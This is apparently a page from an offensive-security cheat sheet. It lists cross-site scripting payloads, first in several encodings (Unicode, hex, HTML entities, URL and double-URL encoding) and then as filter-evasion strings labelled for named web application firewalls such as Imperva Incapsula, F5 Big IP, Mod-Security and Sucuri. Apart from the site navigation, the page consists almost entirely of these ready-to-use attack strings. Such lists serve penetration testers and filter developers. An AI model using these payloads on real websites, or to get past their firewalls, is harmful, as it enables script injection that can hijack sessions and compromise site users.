<h4 id="encoding"><a class="header" href="#encoding">Encoding</a></h4>
<pre><code class="language-none">--------------------------------------------------------------------
Unicode:
&lt;script&gt;\u0061lert(1)&lt;/script&gt;
&lt;script&gt;\u{61}lert(1)&lt;/script&gt;
&lt;script&gt;\u{0000000061}lert(1)&lt;/script&gt;
--------------------------------------------------------------------
Hex:
&lt;script&gt;eval('\x61lert(1)')&lt;/script&gt;
--------------------------------------------------------------------
HTML:
&lt;svg&gt;&lt;script&gt;&amp;#97;lert(1)&lt;/script&gt;&lt;/svg&gt;
&lt;svg&gt;&lt;script&gt;&amp;#x61;lert(1)&lt;/script&gt;&lt;/svg&gt;
&lt;svg&gt;&lt;script&gt;alert&amp;NewLine;(1)&lt;/script&gt;&lt;/svg&gt;
&lt;svg&gt;&lt;script&gt;x="&amp;quot;,alert(1)//";&lt;/script&gt;&lt;/svg&gt;
\’-alert(1)//
--------------------------------------------------------------------
URL:
&lt;a href="javascript:x='%27-alert(1)-%27';"&gt;XSS&lt;/a&gt;
--------------------------------------------------------------------
Double URL Encode:
%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
--------------------------------------------------------------------
Unicode + HTML:
&lt;svg&gt;&lt;script&gt;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x31;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x63;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x35;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x37;&amp;#x32;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x37;&amp;#x34;(1)&lt;/script&gt;&lt;/svg&gt;
--------------------------------------------------------------------
HTML + URL:
&lt;iframe src="javascript:'&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x25;&amp;#x33;&amp;#x45;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x25;&amp;#x33;&amp;#x45;'"&gt;&lt;/iframe&gt;
--------------------------------------------------------------------
</code></pre>
<h4 id="waf-bypass"><a class="header" href="#waf-bypass">WAF Bypass</a></h4>
<pre><code class="language-none">--------------------------------------------------------------------
Imperva Incapsula:
%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%25 23x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%25 26%2523x29%3B%22%3E
&lt;img/src="x"/onerror="[JS-F**K Payload]"&gt;
&lt;iframe/onload='this["src"]="javas&amp;Tab;cript:al"+"ert``"';&gt;&lt;img/src=q onerror='new Function`al\ert\`1\``'&gt;
--------------------------------------------------------------------WebKnight:
&lt;details ontoggle=alert(1)&gt;
&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow="alert(1)"&gt;
--------------------------------------------------------------------
F5 Big IP:
&lt;body style="height:1000px" onwheel="[DATA]"&gt;
&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow="[DATA]"&gt;
&lt;body style="height:1000px" onwheel="[JS-F**k Payload]"&gt;
&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow="[JS-F**k Payload]"&gt;
&lt;body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)"&gt;
&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)"&gt;
--------------------------------------------------------------------Barracuda WAF:
&lt;body style="height:1000px" onwheel="alert(1)"&gt;
&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow="alert(1)"&gt;
--------------------------------------------------------------------
PHP-IDS:
&lt;svg+onload=+"[DATA]"
&lt;svg+onload=+"aler%25%37%34(1)"
--------------------------------------------------------------------
Mod-Security:
&lt;a href="j[785 bytes of (&amp;NewLine;&amp;Tab;)]avascript:alert(1);"&gt;XSS&lt;/a&gt;
1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
&lt;b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)&gt;
--------------------------------------------------------------------
Quick Defense:
&lt;input type="search" onsearch="aler\u0074(1)"&gt;
&lt;details ontoggle="aler\u0074(1)"&gt;
--------------------------------------------------------------------
Sucuri WAF:
1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
--------------------------------------------------------------------
</code></pre>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="XXEXSSDeSerial.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="XXXEMore.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="XXEXSSDeSerial.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="XXXEMore.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>

        <!-- Livereload script (if served using the cli tool) -->
        <script>
            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
            const socket = new WebSocket(wsAddress);
            socket.onmessage = function (event) {
                if (event.data === "reload") {
                    socket.close();
                    location.reload();
                }
            };

            window.onbeforeunload = function() {
                socket.close();
            }
        </script>



        <script>
            window.playground_copyable = true;
        </script>


        <script src="elasticlunr.min.js"></script>
        <script src="mark.min.js"></script>
        <script src="searcher.js"></script>

        <script src="clipboard.min.js"></script>
        <script src="highlight.js"></script>
        <script src="book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
